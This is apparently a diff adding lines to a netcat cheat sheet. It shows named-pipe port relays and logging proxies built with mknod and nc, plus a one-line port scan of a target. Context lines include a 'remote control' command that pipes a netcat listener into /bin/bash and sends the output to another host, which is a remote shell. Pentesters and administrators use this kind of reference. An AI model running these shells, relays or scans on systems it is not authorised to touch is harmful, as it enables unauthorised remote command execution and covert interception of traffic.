@@ -15,3 +15,18 @@ REMOTE CONTROL
 ```
 nc -l 5000 | /bin/bash 2>&1 | nc 192.168.0.39 5001
 ```
+
+Proxy with logging
+//mknod backpipe p ; nc -l -p [remote port] < backpipe  | nc [local IP] [local port] >backpipe
+```
+$ mknod backpipe p ; nc -l -p 1337 < backpipe | tee -a inflow | sudo nc 127.0.0.1 1338 | tee -a outflow 1> backpipe
+
+$ mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe                                           # Port Relay
+$ mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe      # Proxy (Port 80 to 8080)
+$ mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)
+```
+
+Scan the target’s specified port range:
+```
+echo "" | nc -v -n -w1 <target> <port-range>
+```
